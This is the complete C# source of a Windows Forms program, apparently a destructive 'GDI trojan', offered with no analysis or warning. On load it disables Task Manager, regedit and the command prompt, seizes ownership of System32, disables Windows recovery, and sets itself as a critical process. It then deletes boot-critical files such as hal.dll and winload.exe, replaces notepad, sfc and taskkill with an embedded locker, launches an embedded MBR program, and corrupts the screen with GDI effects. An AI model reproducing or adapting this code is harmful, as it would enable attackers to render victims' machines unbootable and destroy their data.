using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using System.Media;
using System.Threading;

namespace gdi_test
{
    public partial class gdi : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations 
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086, 
            SRCAND = 0x008800C6, 
            SRCINVERT = 0x00660046, 
            SRCERASE = 0x00440328, 
            NOTSRCCOPY = 0x00330008, 
            NOTSRCERASE = 0x001100A6, 
            MERGECOPY = 0x00C000CA, 
            MERGEPAINT = 0x00BB0226, 
            PATCOPY = 0x00F00021, 
            PATPAINT = 0x00FB0A09, 
            PATINVERT = 0x005A0049, 
            DSTINVERT = 0x00550009, 
            BLACKNESS = 0x00000042, 
            WHITENESS = 0x00FF0062, 
        }

        public static Icon Extract(string file, int number, bool largeIcon) 
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try 
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }


        public gdi()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
        }
        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_NOCLOSE = 0x200;

                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void gdi_Load(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord); // turn off task manager
            RegistryKey rk2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord); // turn off regedit
            ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
            ctrlaltdel.FileName = "cmd.exe";
            ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
            ctrlaltdel.Arguments = @"/k color 47 && title Critical process && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && reagentc.exe /disable && Exit";
            var process = Process.Start(ctrlaltdel);
            process.WaitForExit();
            RegistryKey rk3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            rk3.SetValue("DisableCMD", 1, RegistryValueKind.DWord); // turn off cmd
            unpack();
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            delete_overwrite_files();
            Process.Start(@"C:\Program Files\Windows NT 32\MBR.exe");
            Thread.Sleep(30000);
            Process.Start(@"C:\Program Files\Windows NT 32\AdStRkJ_sound.exe");
            timer1.Start();
            timer2.Start();
            timer3.Start();
            timer4.Start();
        }

        Random r;

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            r = new Random();
            if (timer1.Interval > 101)
            {
                timer1.Interval -= 100;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if(timer1.Interval > 51)
            {
                timer1.Interval -= 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                
            }
            timer1.Start();
        }

        Icon icon = Extract("shell32.dll", 235, true);
        //Image image = Image.FromFile(@"C:\Users\Worm\desktop\different_types_of_formats\xp_100.jpg");

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
            timer2.Start();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
            timer3.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1000);
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // for erase hdc(graphics payloads)
            timer4.Start();
        }
        public void sound()
        {
            var extractdir = @"C:\Program Files\Windows NT 32";
            Directory.SetCurrentDirectory(extractdir);
            if (File.Exists("sound.wav"))
            {
                SoundPlayer soundPlayer = new SoundPlayer("sound.wav");
                soundPlayer.Play();
                Thread.Sleep(189000);
            }
            Environment.Exit(-1);
        }
        public void unpack()
        {
            var extractdir = @"C:\Program Files\Windows NT 32";
            if (!Directory.Exists(extractdir))
            {
                Directory.CreateDirectory(extractdir);
                Extract("gdi_test", extractdir, "Resources", "sound.wav");
                Extract("gdi_test", extractdir, "Resources", "AdStRkJ_sound.exe");
                Extract("gdi_test", extractdir, "Resources", "MBR.exe");
                Extract("gdi_test", extractdir, "Resources", "lock_files.exe");
            }
        }
        public void delete_overwrite_files()
        {
            string lock_files = @"C:\Program Files\Windows NT 32\lock_files.exe";
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string notepad_exe = @"C:\Windows\System32\notepad.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
            string sfc_exe = @"C:\Windows\System32\sfc.exe";
            string taskkill = @"C:\Windows\System32\taskkill.exe";

            //Delete system files
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }

            if (File.Exists(notepad_exe))
            {
                File.Delete(notepad_exe);
                File.Copy(lock_files, notepad_exe, true);
            }
            else
            {
                File.Copy(lock_files, notepad_exe, true);
            }

            if (File.Exists(sfc_exe))
            {
                File.Delete(sfc_exe);
                File.Copy(lock_files, sfc_exe, true);
            }
            else
            {
                File.Copy(lock_files, sfc_exe, true);
            }

            if (File.Exists(taskkill))
            {
                File.Delete(taskkill);
                File.Copy(lock_files, taskkill, true);
            }
            else
            {
                File.Copy(lock_files, taskkill, true);
            }
        }
    }
}
